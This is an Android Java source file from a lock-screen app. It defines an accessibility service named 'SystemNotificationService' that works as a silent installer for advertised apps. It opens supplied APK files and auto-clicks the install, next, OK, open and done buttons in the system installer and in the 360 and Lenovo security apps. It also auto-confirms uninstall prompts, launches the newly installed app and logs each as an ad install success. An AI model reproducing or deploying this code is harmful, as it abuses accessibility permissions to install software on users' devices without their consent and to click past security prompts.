package com.lockstudio.sticklocker.service;

import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.lockstudio.sticklocker.util.CustomEventCommit;
import com.lockstudio.sticklocker.util.RLog;

import java.io.File;
import java.util.List;

import cn.opda.android.activity.R;

public class SystemNotificationService extends AccessibilityService {

    private static final String TAG = "V5_SYSTEMNOTIFICATIONSERVICE";

    private static final String INSTALLER_SYS = "com.android.packageinstaller";
    private static final String INSTALLER_360 = "com.qihoo360.mobilesafe";
    private static final String INSTALLER_360_geek = "com.qihoo.antivirus";
    private static final String INSTALLER_LENOVO_SAFECENTER = "com.lenovo.safecenter";
    private static final String INSTALLER_LENOVO_SECURITY = "com.lenovo.security";

    private int INVOKE_TYPE = 0;
    public static final int TYPE_KILL_APP = 1;
    public static final int TYPE_INSTALL_APP = 2;
    public static final int TYPE_INSTALL_APP_OPEN = 3;
    public static final int TYPE_UNINSTALL_APP = 4;

    private String packageName = "";
    private String title = "";
    private boolean action_back = false;

    @Override
    public void onCreate() {
        super.onCreate();

        startService(new Intent(this, CoreService.class));
        CustomEventCommit.commit(this, TAG, "onCreate");

        try {
            IntentFilter filter = new IntentFilter();
            filter.setPriority(1000);
            filter.addAction(Intent.ACTION_PACKAGE_ADDED);
            filter.addDataScheme("package");
            registerReceiver(broadcastReceiver, filter);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            unregisterReceiver(broadcastReceiver);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            INVOKE_TYPE = intent.getIntExtra("TYPE", 0);
            if (INVOKE_TYPE != 0) {
                String apkFile = intent.getStringExtra("APK");
                packageName = intent.getStringExtra("PN");
                title = intent.getStringExtra("TITLE");

                try {
                    Intent it = new Intent(Intent.ACTION_VIEW);
                    it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    it.setDataAndType(Uri.fromFile(new File(apkFile)), "application/vnd.android.package-archive");
                    startActivity(it);
                    CustomEventCommit.commit(SystemNotificationService.this, DPService.TAG, title + "[自动安装]");
                } catch (Exception e) {
                    e.printStackTrace();
                    INVOKE_TYPE = 0;
                }
            }
        }
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        try {
            startService(new Intent(this, CoreService.class));
        } catch (Exception e) {
            e.printStackTrace();
        }
//        AccessibilityNodeInfo nodeInfo = event.getSource();
//        nodeInfo.recycle();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN && event != null) {
            try {
                processAccessibilityEvent(event);
            } catch (Exception e) {
                e.printStackTrace();
            }
//            processInstallApplication(event, false);
        }

    }

    @Override
    public boolean onUnbind(Intent intent) {
        CustomEventCommit.commit(this, TAG, "onUnbind:" + intent);
        return super.onUnbind(intent);
    }

    @Override
    public void onInterrupt() {
        CustomEventCommit.commit(this, TAG, "onInterrupt");
    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    private void processAccessibilityEvent(AccessibilityEvent event) {
//        RLog.d("test", "event = " + event);
//        RLog.d("test", "INVOKE_TYPE = " + INVOKE_TYPE);
        switch (INVOKE_TYPE) {

            case TYPE_INSTALL_APP:
                processInstallApplication(event, false);
                break;

            case TYPE_INSTALL_APP_OPEN:
                processInstallApplication(event, true);
                break;

            case TYPE_UNINSTALL_APP:
                processUninstallApplication(event);
                break;

            default:
                break;
        }

        if (action_back) {
            action_back = false;
            INVOKE_TYPE = 0;
            try {
                performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    private void processUninstallApplication(AccessibilityEvent event) {
        final String pName = (String) event.getPackageName();
        if (INSTALLER_SYS.equals(pName) || INSTALLER_360.equals(pName) || INSTALLER_360_geek.equals(pName) || INSTALLER_LENOVO_SAFECENTER.equals(pName) || INSTALLER_LENOVO_SECURITY.equals(pName)) {
            if (event.getSource() != null) {
                String str_ok = getString(R.string.a_ok);
                List<AccessibilityNodeInfo> ok_nodes = event.getSource().findAccessibilityNodeInfosByText(str_ok);
                if (ok_nodes != null && !ok_nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : ok_nodes) {
                        if (node != null && "android.widget.Button".equals(node.getClassName()) && node.isEnabled()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                }
            }
        }
    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    private void processInstallApplication(AccessibilityEvent event, boolean execute) {
        final String pName = (String) event.getPackageName();
        if (INSTALLER_SYS.equals(pName) || INSTALLER_360.equals(pName) || INSTALLER_360_geek.equals(pName)  || INSTALLER_LENOVO_SAFECENTER.equals(pName) || INSTALLER_LENOVO_SECURITY.equals(pName)) {
            if (event.getSource() != null) {

                String str_install = getString(R.string.a_install);
                List<AccessibilityNodeInfo> install_nodes = event.getSource().findAccessibilityNodeInfosByText(str_install);
                if (install_nodes != null && !install_nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : install_nodes) {
                        if (node != null && node.isEnabled() && "android.widget.Button".equals(node.getClassName())) {
                            try {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            action_back = true;
                        }
                    }
                }

                String str_next = getString(R.string.a_next);
                List<AccessibilityNodeInfo> next_nodes = event.getSource().findAccessibilityNodeInfosByText(str_next);
                if (next_nodes != null && !next_nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : next_nodes) {
                        if (node != null && node.isEnabled() && "android.widget.Button".equals(node.getClassName())) {
                            try {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }

                String str_ok = getString(R.string.a_ok);
                List<AccessibilityNodeInfo> ok_nodes = event.getSource().findAccessibilityNodeInfosByText(str_ok);
                if (ok_nodes != null && !ok_nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : ok_nodes) {
                        if (node != null && node.isEnabled() && "android.widget.Button".equals(node.getClassName())) {
                            try {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }

                String str_finish;
                if (execute) {
                    str_finish = getString(R.string.a_open);
                } else {
                    str_finish = getString(R.string.a_done);
                }

                List<AccessibilityNodeInfo> finish_nodes = event.getSource().findAccessibilityNodeInfosByText(str_finish);
                if (finish_nodes != null && !finish_nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : finish_nodes) {
                        if (node != null && node.isEnabled() && "android.widget.Button".equals(node.getClassName())) {
                            try {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
        }
    }


    public static boolean isAccessibilitySettingsOn(Context mContext) {
        int accessibilityEnabled = 0;
        final String service = mContext.getPackageName() + "/" + SystemNotificationService.class.getName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    mContext.getApplicationContext().getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                    mContext.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                TextUtils.SimpleStringSplitter splitter = mStringColonSplitter;
                splitter.setString(settingValue);
                while (splitter.hasNext()) {
                    String accessabilityService = splitter.next();

                    if (accessabilityService.equalsIgnoreCase(service)) {
                        return true;
                    }
                }
            }
        }

        return false;
    }


    private BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {

        @Override
        public void onReceive(Context context, Intent intent) {
            RLog.d(TAG, intent + "");
            String action = intent.getAction();
            if (Intent.ACTION_PACKAGE_ADDED.equals(action)) {
                String pn = intent.getData().getSchemeSpecificPart();
                if (!TextUtils.isEmpty(pn)) {
                    if (pn.equals(packageName) && !TextUtils.isEmpty(title)) {

                        try {
                            Intent intent2 = getPackageManager().getLaunchIntentForPackage(packageName);
                            intent2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(intent2);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }

                        CustomEventCommit.commit(SystemNotificationService.this, DPService.TAG, title + "[广告安装成功]");
                    }
                }

                INVOKE_TYPE = 0;
                packageName = "";
                title = "";
            }
        }
    };
}
